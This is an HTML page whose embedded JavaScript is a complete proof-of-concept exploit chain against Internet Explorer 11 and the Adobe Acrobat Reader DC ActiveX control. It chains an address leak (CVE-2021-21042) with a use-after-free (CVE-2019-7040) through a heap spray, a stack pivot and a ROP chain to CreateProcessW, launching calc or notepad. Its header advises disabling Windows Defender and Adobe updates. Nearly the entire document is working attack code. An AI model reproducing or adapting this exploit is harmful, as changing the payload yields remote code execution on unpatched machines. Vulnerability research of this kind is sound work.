<html>
    <head>
        <script>

            /***

                Exploit for Microsoft Internet Explorer 11 (protected mode off) & Adobe Acrobat Reader DC ActiveX.

                    + Dependencies:

                        Adobe Acrobat Reader DC version: 2019.008.20081.
                        Adobe Acrobat Reader DC ActiveX file version: 19.8.20071.41678
                        Adobe Acrobat Reader DC ActiveX product version: 19.8.20071.303822
                        Windows version: 10.0.19044.1826
                        user32.dll (SHA256 hash): BFB8A8283152E7FA4E010A857EB66951F29F16865369E1D0DB58ECC964D51C31
                        AcroRd32.dll (SHA256 hash): FA8627F6E2D58AF00EFA9E0B2D49A2E2426CDBF16DA117951A17C8A2E8F970AA
                        AcroPDFImpl.dll (SHA256 hash): 6FB35628AF6395414B688184FA0E717FBAE16D3AE2FDCC5530553B05E25A7979

                    + Info:

                        CVE-2021-21042 to leak base address for user32.dll.
                        CVE-2019-7040 to get RCE.
                        It's recommended disabling Adobe Acrobat Update Service to avoid automatic updates (AdobeARMservice | armsvc.exe).
                        As this exploit uses common heap spray techniques, it's also recommended disabling Windows Defender.

                    + References:

                        CVE-2021-21042: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21042
                        CVE-2019-7040: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7040

            ***/

            /* Helper function to log info */
            function println(str){
                document.getElementById("log").innerHTML += "[+] " + str + "<br>";
            }

            /* Helper function to transform a string to wstring and keeping 32-bit alignment */
            function str2wstr(str){
                var ret = "";
                for(var i=0;i<str.length;i++){
                    ret += unescape("%u00" + str.charCodeAt(i).toString(16));
                }
                ret += unescape("%u0000");
                while(ret.length % 0x10 !== 0){
                    ret += unescape("%u0000");
                }
                return ret;
            }

            /* Helper function to transform a dword to string keeping 32-bit alignment */
            function dw2str(dword){
                var ret = Number(dword).toString(16);
                while (ret.length < 8){
                    ret = '0' + ret;
                }
                return unescape('%u' + ret.substr(4, 8) + '%u' + ret.substr(0, 4));
            }

            /* RCE exploit for CVE-2019-7040 */
            function CVE20197040(base){ 
                println("Exploiting CVE-2019-7040.");

                // Global vars
                var realloc = new Array();
                var targetarr = ["foo", "bar"];
                var lfh = new Array();
                var spray = new Array();

                // Load Adobe Acrobat ActiveX
                var targetobj = new ActiveXObject("AcroPDF.PDF");
                targetobj.src = "testcase.pdf";

                // Rop chain to execute CreateProcessW from user32.dll
                var rop = dw2str(base+0x4395b);                 // user32.dll (base+0x4395b): jmp CreateProcessW
                rop += dw2str(0x41414141);                      // ret addr

                // CreateProcessW: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
                rop += dw2str(0x10206094);                      // arg0: LPCWSTR lpApplicationName
                rop += dw2str(0x0);                             // arg1: LPWSTR  lpCommandLine
                rop += dw2str(0x0);                             // arg2: LPSECURITY_ATTRIBUTES lpProcessAttributes
                rop += dw2str(0x0);                             // arg3: LPSECURITY_ATTRIBUTES lpThreadAttributes
                rop += dw2str(0x0);                             // arg4: BOOL bInheritHandles
                rop += dw2str(0x0);                             // arg5: DWORD dwCreationFlags
                rop += dw2str(0x0);                             // arg6: LPVOID lpEnvironment
                rop += dw2str(0x0);                             // arg7: LPCWSTR lpCurrentDirectory
                rop += dw2str(0x10206050);                      // arg8: LPSTARTUPINFOW lpStartupInfo
                rop += dw2str(0x10206040);                      // arg9: LPPROCESS_INFORMATION lpProcessInformation

                // PROCESS_INFORMATION structure: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
                rop += dw2str(0x0);                             // HANDLE hProcess
                rop += dw2str(0x0);                             // HANDLE hThread
                rop += dw2str(0x0);                             // DWORD  dwProcessId
                rop += dw2str(0x0);                             // DWORD  dwThreadId

                // STARTUPINFOW structure: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
                rop += dw2str(0x44);                            // DWORD  cb
                rop += dw2str(0x0);                             // LPWSTR lpReserved
                rop += dw2str(0x0);                             // LPWSTR lpDesktop
                rop += dw2str(0x0);                             // LPWSTR lpTitle
                rop += dw2str(0x0);                             // DWORD  dwX
                rop += dw2str(0x0);                             // DWORD  dwY
                rop += dw2str(0x0);                             // DWORD  dwXSize
                rop += dw2str(0x0);                             // DWORD  dwYSize
                rop += dw2str(0x0);                             // DWORD  dwXCountChars
                rop += dw2str(0x0);                             // DWORD  dwYCountChars
                rop += dw2str(0x0);                             // DWORD  dwFillAttribute
                rop += dw2str(0x0);                             // DWORD  dwFlags
                rop += dw2str(0x0);                             // WORD   wShowWindow & WORD   cbReserved2
                rop += dw2str(0x0);                             // LPBYTE lpReserved2
                rop += dw2str(0x0);                             // HANDLE hStdInput
                rop += dw2str(0x0);                             // HANDLE hStdOutput
                rop += dw2str(0x0);                             // HANDLE hStdError

                // Choose random payload between calc and notepad. Remember IE rendering process is by default 32-bit.
                if(Math.floor((Math.random() * 2)) == 0){
                    var payload = str2wstr("C:\\Windows\\SysWOW64\\calc.exe");
                }else{
                    var payload = str2wstr("C:\\Windows\\SysWOW64\\notepad.exe");
                }

                // Create the final chunk
                var chunk = rop + payload;

                // Spraying the heap
                while(chunk.length < 0x200) chunk += dw2str(0x42424242);
                while (chunk.length < 0x1000) chunk += dw2str(0x43434343);
                bchunk = chunk.substring(0, 0x800);
                while (bchunk.length < 0x80000) bchunk += bchunk;
                for (var i = 0; i < 0x200; i++){
                    var button = window.document.createElement("button");
                    button.title = bchunk.substring(0,(0x80000-2)/2);
                    spray.push(button);
                }

                // Create fake object (0x58 bytes): stack pivot
                var pivot = dw2str(base+0x00033bc6);            // user32.dll (base+0x00033bc6): pop eax # retn
                pivot += dw2str(0x10206010);                    // 0x10206010: target addr to execute CreateProcessW
                pivot += dw2str(base+0x0002b748);               // user32.dll (base+0x0002b748): xchg eax,esp # retn
                pivot += "AAAAAAAAAAAAAAAAAA";                  // Junk 1
                pivot += dw2str(base+0x0002b593);               // user32.dll (base+0x0002b593): mov eax,ecx # pop esi # pop ebp # retn 4
                pivot += "BBBBBB";                              // Junk 2
                pivot += dw2str(base+0x0002b748);               // user32.dll (base+0x0002b748): xchg eax,esp # retn
                pivot += "CCCCCCCCC";                           // Junk 3

                // Trigger LFH
                for (var i=0; i<0x20; i++) {
                    var div = window.document.createElement("div");
                    div.title = pivot;
                    lfh.push(div);
                }

                // Prepare fake allocations
                for (var i=0; i<0x100; i++){
                    realloc.push(window.document.createElement("div"));
                }

                // Callback to trigger free
                Object.defineProperty(targetarr, '0', {
                    get: function() {

                        // Trigger free
                        targetobj.LoadFile("test");

                        // Realloc free slot
                        for (var i=0; i<0x100; i++){
                            realloc[i].title = pivot;
                        }
                        return "foo";
                    }
                });

                println("Triggering RCE.");
        
                // Start use-after-free
                setInterval(function(){
                    targetobj.postMessage(targetarr);
                },0);
            }

            /* Info leak exploit for CVE-2021-21042 */
            function CVE202121042(leak){
                println("Exploiting CVE-2021-21042.");
                println("Base address for user32.dll: 0x" + leak);
                var baseuser32 = parseInt(leak, 16);

                // Clear document to trigger CVE-2019-7040. The exploit becomes more reliable.
                document.clear();
                CollectGarbage();
                CollectGarbage();

                // Exploiting CVE-2019-7040
                CVE20197040(baseuser32);
            }

            /* Get disclosed addr from PDF File */
            function exploit(){
                println("Starting exploit.");
                var pdfobj = document.getElementById("pdfobj");
                if(typeof pdfobj.readyState === 'undefined'){
                    pdfobj.messageHandler = { onMessage: CVE202121042 };  
                    return;
                }
                if(pdfobj.readyState==4){
                    pdfobj.messageHandler = { onMessage: CVE202121042 };
                }else{
                    setTimeout(runExploit, 500);
                }
            }

            /* Main */
            function main(){

                // Create HTML Div Element to log
                var div = document.createElement("div");
                div.id = "log";
                document.documentElement.appendChild(div);

                // Create HTML Object Element that triggers Adobe Acrobat ActiveX loading
                var obj = document.createElement("object");
                obj.classid = "clsid:CA8A9780-280D-11CF-A24D-444553540000";
                obj.id = "pdfobj";
                obj.height = 0;
                obj.width = 0;

                // Add readystatechange event listener to know when pdf file is loaded
                obj.addEventListener("readystatechange", exploit, false);

                // Create HTML Param Element
                var param = document.createElement("param");
                param.name = "src";

                // Set pdf exploit for CVE-2021-21042
                param.value = "exploit.pdf";
                obj.appendChild(param);
                document.documentElement.appendChild(obj);
            }

            main();

        </script>
    </head>
</html>
